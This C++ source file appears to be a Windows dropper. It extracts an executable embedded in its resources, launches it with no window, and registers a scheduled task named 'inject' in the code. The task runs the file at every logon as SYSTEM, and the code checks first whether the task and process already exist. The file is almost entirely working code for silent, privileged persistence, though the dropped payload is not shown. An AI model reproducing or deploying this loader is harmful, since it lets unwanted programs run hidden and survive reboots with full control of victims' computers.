#include <windows.h>
#include <fstream>
#include <cstdlib>
#include <tuple>
#include <iostream>
#include <tlhelp32.h>
#include <shlobj.h>
#include <Objbase.h>
#include <taskschd.h>
#include <comdef.h>
#include <atlbase.h>

#include "resourceloader.h"
#include "launcher.h"

using namespace std;

static wchar_t* stringToWString(string str) {
	int length = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
	wchar_t* w_string = new wchar_t[length];
	MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, w_string, length);
	return w_string;
}

bool Launcher::checkPrivileges() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);

		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}

	if (hToken) {
		CloseHandle(hToken);
	}

	return fRet;
}

bool Launcher::checkExtracted() {
	ifstream file(EXTRACT_LOCATION);
	return file.good();
}

void Launcher::extract() {
	cout << "extracting" << endl;

	ofstream file(EXTRACT_LOCATION, ios::binary);

	tuple<char*, size_t> exe = resource::loadExe();
	file.write(get<0>(exe), get<1>(exe));

	file.close();

	cout << "extracted" << endl;
}

bool Launcher::checkRunning() {
	bool result = false;

	wchar_t* exe_name = stringToWString(NAME + ".exe");

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hSnapshot, &pe32)) {
			do {
				wstring proccess_name = pe32.szExeFile;
				if (exe_name == proccess_name) {
					result = true;
					break;
				}
			} while (Process32Next(hSnapshot, &pe32));
		}
		CloseHandle(hSnapshot);
	}

	return result;
}

void Launcher::launch() {
	cout << "launching" << endl;

	wchar_t* exe_path = stringToWString(EXTRACT_LOCATION);

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(NULL,
		exe_path,
		NULL,
		NULL,
		FALSE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi
	);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	cout << "launched" << endl;
}

bool Launcher::checkInjected() {
	HRESULT hr = S_OK;
	bool injected = false;

	hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr)) cerr << "inject check error";

	CComPtr<ITaskService> pService;
	hr = pService.CoCreateInstance(CLSID_TaskScheduler);
	if (FAILED(hr)) {
		CoUninitialize();
		cerr << "inject check error";
	}

	hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
	if (FAILED(hr)) {
		CoUninitialize();
		cerr << "inject check error";
	}

	CComPtr<ITaskFolder> pRootFolder;
	hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
	if (FAILED(hr)) {
		CoUninitialize();
		cerr << "inject check error";
	}

	CComPtr<IRegisteredTask> pRegisteredTask;
	hr = pRootFolder->GetTask(_bstr_t(NAME.c_str()), &pRegisteredTask);
	if (SUCCEEDED(hr) && pRegisteredTask) injected = true;
	else if (hr == HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND)) hr = S_OK;
	else cerr << "inject check error";

	pRegisteredTask.Release();
	pRootFolder.Release();
	pService.Release();

	CoUninitialize();

	return injected;
}

void Launcher::inject() {
	cout << "injecting" << endl;

	HRESULT hr = S_OK;

	hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr)) cerr << "inject error";

	CComPtr<ITaskService> pService;
	hr = pService.CoCreateInstance(CLSID_TaskScheduler);
	if (FAILED(hr)) {
		CoUninitialize();
		cerr << "inject error";
	}

	hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
	if (FAILED(hr)) {
		CoUninitialize();
		cerr << "inject error";
	}

	CComPtr<ITaskFolder> pRootFolder;
	hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
	if (FAILED(hr)) {
		CoUninitialize();
		cerr << "inject error";
	}

	CComPtr<ITaskDefinition> pTask;
	hr = pService->NewTask(0, &pTask);
	if (FAILED(hr)) {
		CoUninitialize();
		cerr << "inject error";
	}

	CComPtr<ITaskSettings> pSettings;
	hr = pTask->get_Settings(&pSettings);
	if (FAILED(hr)) {
		CoUninitialize();
		cerr << "inject error";
	}
	pSettings->put_StartWhenAvailable(VARIANT_TRUE);
	pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
	pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
	pSettings->put_RunOnlyIfIdle(VARIANT_FALSE);

	CComPtr<ITriggerCollection> pTriggerCollection;
	hr = pTask->get_Triggers(&pTriggerCollection);
	if (FAILED(hr)) {
		CoUninitialize();
		cerr << "inject error";
	}
	CComPtr<ITrigger> pTrigger;
	hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
	if (FAILED(hr)) {
		CoUninitialize();
		cerr << "inject error";
	}

	CComPtr<IActionCollection> pActionCollection;
	hr = pTask->get_Actions(&pActionCollection);
	if (FAILED(hr)) {
		CoUninitialize();
		cerr << "inject error";
	}
	CComPtr<IAction> pAction;
	hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	if (FAILED(hr)) {
		CoUninitialize();
		cerr << "inject error";
	}
	CComPtr<IExecAction> pExecAction;
	hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
	if (FAILED(hr)) {
		CoUninitialize();
		cerr << "inject error";
	}
	pExecAction->put_Path(_bstr_t(EXTRACT_LOCATION.c_str()));

	CComPtr<IRegisteredTask> pRegisteredTask;
	hr = pRootFolder->RegisterTaskDefinition(
		_bstr_t(NAME.c_str()),
		pTask,
		TASK_CREATE_OR_UPDATE,
		_variant_t(L"S-1-5-18"),
		_variant_t(),
		TASK_LOGON_SERVICE_ACCOUNT,
		_variant_t(L""),
		&pRegisteredTask);
	if (FAILED(hr)) {
		CoUninitialize();
		cerr << "inject error";
	}

	pExecAction.Release();
	pAction.Release();
	pActionCollection.Release();
	pTrigger.Release();
	pTriggerCollection.Release();
	pSettings.Release();
	pTask.Release();
	pRootFolder.Release();
	pService.Release();
	pRegisteredTask.Release();

	CoUninitialize();

	cout << "injected" << endl;
}

void Launcher::main() {
	if (!checkExtracted()) extract();
	if (!checkRunning()) {
		launch();
		if (!checkInjected()) inject();
	}
	else {
		cout << "already running" << endl;
	}
}